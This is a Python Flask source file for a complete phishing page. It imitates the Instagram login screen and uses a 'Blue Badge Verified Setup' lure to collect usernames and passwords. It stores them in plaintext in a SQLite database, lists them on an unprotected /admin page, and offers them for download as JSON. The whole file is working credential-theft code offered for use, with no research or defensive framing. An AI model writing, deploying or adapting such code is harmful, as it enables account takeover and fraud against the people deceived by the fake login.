from flask import Flask, request, render_template_string, send_file
import sqlite3, os, json
from datetime import datetime

app = Flask(__name__)

# Instagram style HTML
HTML = """
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Login • Instagram</title>
  <style>
    body{background:#000;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
    .box{width:350px;padding:30px;border:1px solid #222;text-align:center;background:#000}
    h1{font-family:"Brush Script MT",cursive;font-size:45px;margin:0 0 18px}
    input{width:100%;padding:12px;margin:8px 0;border-radius:4px;border:1px solid #333;background:#111;color:#fff}
    button{width:100%;padding:12px;margin-top:8px;background:#0095f6;border:none;color:#fff;font-weight:700;border-radius:4px;cursor:pointer}
  </style>
</head>
<body>
  <div class="box">
    <h1>Instagram</h1>
    <form method="POST">
      <input name="username" placeholder="Phone, username, or email" required>
      <input name="password" placeholder="Password" type="password" required>
      <button type="submit">Log in</button>
    </form>
    <p style="margin-top:12px;font-size:13px;color:#aaa">
<p>Blue Badge Verified Setup</p>
  </div>
</body>
</html>
"""

DB_FILE = "logins.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
      CREATE TABLE IF NOT EXISTS logins (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT,
        password TEXT,
        ts TEXT
      )
    """)
    conn.commit()
    conn.close()

@app.route("/", methods=["GET","POST"])
def index():
    if request.method == "POST":
        u = request.form["username"]
        p = request.form["password"]
        ts = datetime.utcnow().isoformat()

        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("INSERT INTO logins (username,password,ts) VALUES (?,?,?)", (u,p,ts))
        conn.commit()
        conn.close()
        return "<h3>✅ Saved Successfully!</h3><p><a href='/'>Back</a></p>"
    return render_template_string(HTML)

@app.route("/admin")
def admin():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, password, ts FROM logins ORDER BY id DESC")
    rows = c.fetchall()
    conn.close()
    table = "<h2>Saved Logins</h2><table border=1><tr><th>ID</th><th>Username</th><th>Password</th><th>Time</th></tr>"
    for r in rows:
        table += f"<tr><td>{r[0]}</td><td>{r[1]}</td><td>{r[2]}</td><td>{r[3]}</td></tr>"
    table += "</table><p><a href='/download'>Download JSON</a></p>"
    return table

@app.route("/download")
def download():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT username,password,ts FROM logins ORDER BY id DESC")
    data = [{"username":r[0],"password":r[1],"time":r[2]} for r in c.fetchall()]
    conn.close()
    fname = "saved_logins.json"
    with open(fname,"w") as f:
        json.dump(data,f,indent=2)
    return send_file(fname, as_attachment=True)

if __name__ == "__main__":
    init_db()
    app.run(host="0.0.0.0", port=5000, debug=True)